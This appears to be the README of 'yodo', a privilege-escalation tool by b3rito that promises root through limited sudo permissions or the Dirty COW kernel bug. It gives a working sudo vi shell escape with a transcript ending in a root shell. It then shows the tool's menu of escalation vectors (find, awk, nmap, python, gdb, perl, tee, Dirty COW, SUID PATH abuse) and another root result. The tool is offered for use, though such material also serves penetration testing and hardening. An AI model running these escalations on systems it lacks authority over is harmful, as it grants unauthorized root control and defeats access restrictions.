# yodo
This tool proves how easy it is to become root via limited sudo permissions or via dirtyc0w

Example:
If a user has sudo privileges only on vi, he could become root by runnuing this command: sudo vi -c ':shell'

    b3rito@victim ~/Desktop $ sudo vi -c ':shell'
    [sudo] password for b3rito:
    victim Desktop # whoami
    root

# Author
Written by b3rito at mes3hacklab

# Installation
    chmod +x yodo.sh

# Usage
./yodo.sh
    
    b3rito@victim ~/Desktop $ ./yodo.sh
    =======================================================================                                                       
                                    ....                         
                                ..  .77.                        
                                Z.  ,77?                        
                               .Z$.....,?+?.       
                       ....     $?Z.77+??I..            
                       .7I.  .....~.77:=I..Z.....      
                       .77?  ..7?.?.=7....ZO..~..            
                   ..  ..7$7.=7I$.??+.$$~.==.??..    .~..  
                  .$Z$..Z...77.$7..+=?,.I?=.++.+~....?7... ..  
                   ..?.I7:..77....$$IO++??=...7$.Z$..7$?..7$  
                   .77.+:$?7..Z$.?,.~M,?,..77. .ZZ...,,.$77.. 
              ..$=. +7$7...77+$I? ???M.$.I:~I?..,$..7$.Z7=.   
              ..Z7Z.=..~,.....,=O...~MI=~=...O$.~...?7..:$7I. 
              ...Z.Z.?I?.=:.??...??..M.ZZ.. ,.~Z$I,.,7...I.,....   
              ..,......:.~~.?.?+..?~7M..,?...==.~7..:.Z$+.. ....
                .?7..??,...Z.=?:.I7..M. D$Z?$+=.:... +Z+,....77.....
          .$~...:+O7$.+I+$=~:.=...7,:M.M~7 ..Z$..+~:?...7?$.?$~.OZZ$Z...
          ..$I7=?I?,..7?$$M..=:..?...MM.7$,.7...:??....,7I...?..Z$Z$$$.
          ...,=~.?.+.7.....8.$...?,+~MD+I...$7.I.O$Z$.. D8..I=$:$,....
            .$~+$....7Z.$$$7M.?+=$..,M8 .Z.I., M,ZZZ.MM..7+?+77..7..
              .. ...$.MM.....MZ$~Z:Z,MM.O$,$7,MZ .NMM.~77.+?+.7...
                 I7~Z....MM .M7Z....?MMO,Z..$.M 8MM ..=77I=~?..I~.
            .$7I7?.+...$...:MMM. .$=OMM?Z,,..MMMMMMMMMMMMMI..=Z$+...
            ..?7I$$I.+.O:Z,=.8MN.$??MMM..$7.MMM...Z.$.+,?.Z.Z=..$77$..
                   ...?OMMMMMMDMM7$IMMM ..MMM..,$7.Z$Z..??I$,Z.?I...
                   7?:++.??=...~8D..MMM MMMM.???.$...~$.....$Z..7$.. 
                   .....??,::Z$::MM.MMMMMM,,=II?II,.....   ...... ..
                        ,...?:...IOOO8OO8 ?I,:        ,.     
                            .     88OOOO. :.                 
                           .:,,,:,.8OOOO :.                  
                           .,....,. OO8M:.. :.               
                            ..... . 8OMN.:.                  
                                   .ONM8::.                  
                    :8MDO  8MDO   :8MDO,    DMO8M       :8MDO, 
                      DMO  DMO  .+8D   MO,  DMO  8M   .+8D   MO,
                        O  O    $O     OMM  DMO   8M  $O     OMM 
                      :8MDO    .OO     O8   DMO  8M  .OO     O8M,
                      DMO         .8°O88    DMO8M       .8°O88
                                  .8OOOO. .           :.       
                       ...         OOOOO,.                       
        ..  . ......    .........,.MMMMMMI.,........... .       
          .     .. ,INMMMMMMMMMMMMMMMMMMIZMMMMMMMN7=..... . . .  ..
                 .  =. ......~?ZMMMIM.MM NMMN...   .......=+ . .  
                 .  .. .  .$...MM,.MM ..MD....MMMMO... .. ..,..~ 
                 ,     .   . :MM.  MM  .ZMM?.. .$M...7MD77ZD+.,. 
              .    .  :=D7Z8MM.   .M:   .. .MD.. .7D~. ..,.O. .. 
              .. $..=.    ?M?. .. .M.  ..M...IMM  .,..M ..   ..:.. 
              . ..... . .MM.Z   D ,M+. . :+..M. N+ . . ..? . .... 
                       .M7=.+.=.~.:MM.    .  , . .M..   .  ,.  
                      .N?.8. ~  ..,M 8. ... . M. . M.      . . .  
                  . ..NM .$..    .MM...  .    ,+.:: 8 .         
                 . =M.M ..?..    ..M  M .   . .M .I,.M.       
            ,~~  .   .I...8..    M M  .8,.     Z.... b3    
               .     +.   +. .. : .M....O.    ...  . D.=.   
                     O.  .~,    $. 8     .    .~.  ..+ .   
                     8.   ...   M. ,..   , +   .I.. .,..7  
                     O.    .    I   I     ..  .   .  .... 
                     +.      .  :  .M.                   
                      .         .   M                  
                     ..         .   ..                
                     .          .                    
                      ~.             N.                                         
    =======================================================================
    Possible exploitable options (dirtyc0w | VSP | Pathzuzu excluded):
     [·] find
     [·] vi
     [·] b3
 
     Select From the menu:
 
       1) Find                8) More *                15) Tee
       2) AWK                 9) Man  *                16) VSP °
       3) Nmap               10) Dirtyc0w °            17) Pathzuzu °
       4) Vi                 11) Gdb                   18) Credits
       5) Python             12) Ruby                  19) Update
       6) Irb                13) b3                    99) Exit
       7) Less *             14) Perl
         
     VSP = Vulnerable Script Permissions
     Pathzuzu = SUID exploitation threw Path vulnerability
     * user interatcion
     ° sudo not required
    Enter Number: 1
    [sudo] password for b3rito:
    victim Desktop # whoami
    root
    victim Desktop #
